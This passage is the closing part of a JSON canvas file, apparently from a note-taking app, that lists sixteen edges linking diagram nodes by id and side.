		{"id":"66b73dfcc341c070","fromNode":"252d6a57c9e5633f","fromSide":"bottom","toNode":"9e1457e080b8b42e","toSide":"top"},
		{"id":"ffcd7f5e2a7c40d0","fromNode":"9e1457e080b8b42e","fromSide":"right","toNode":"b1381784fab95179","toSide":"left"},
		{"id":"107ae886907186f0","fromNode":"9e1457e080b8b42e","fromSide":"left","toNode":"5dc487a7d73687cf","toSide":"right"},
		{"id":"397b43f5f685b538","fromNode":"9b089992127efb2a","fromSide":"left","toNode":"5dc487a7d73687cf","toSide":"right"},
		{"id":"531f54a8c75af4b1","fromNode":"252d6a57c9e5633f","fromSide":"left","toNode":"5dc487a7d73687cf","toSide":"right"},
		{"id":"9bb2651515ffcbb2","fromNode":"5dc487a7d73687cf","fromSide":"left","toNode":"d68c135cc521fa55","toSide":"right"},
		{"id":"5231535af9436947","fromNode":"5dc487a7d73687cf","fromSide":"top","toNode":"83ecc46176258f59","toSide":"bottom"},
		{"id":"f8bd9b17d599384a","fromNode":"fe1e0f8a5385dd36","fromSide":"right","toNode":"15a4ee5557c15826","toSide":"left"},
		{"id":"0d917bfe063f9e93","fromNode":"fe1e0f8a5385dd36","fromSide":"left","toNode":"6187994dc5ea5ada","toSide":"right"},
		{"id":"8093fd4ded5bfe81","fromNode":"82997538f7c8c3aa","fromSide":"top","toNode":"fe1e0f8a5385dd36","toSide":"bottom"},
		{"id":"05e719a7e12c1c9c","fromNode":"82997538f7c8c3aa","fromSide":"bottom","toNode":"ec1385f10cde2c03","toSide":"top"},
		{"id":"ae960e3abc748e47","fromNode":"fd2a2e71cdca13de","fromSide":"right","toNode":"4da9b83a85935c41","toSide":"left"},
		{"id":"3ee2c53c7d5e77df","fromNode":"fd2a2e71cdca13de","fromSide":"right","toNode":"7d1a9e532c666555","toSide":"left"},
		{"id":"49ae0dd27fb41c0e","fromNode":"82997538f7c8c3aa","fromSide":"right","toNode":"80cd5e7cc113b966","toSide":"left"},
		{"id":"bde4e43e741e0c57","fromNode":"fd2a2e71cdca13de","fromSide":"bottom","toNode":"7115532522bd39df","toSide":"top"},
		{"id":"ddf6285ec4779355","fromNode":"fe60ba66cb71ba5e","fromSide":"right","toNode":"1df3ef91eb79a52c","toSide":"left"}
	]
}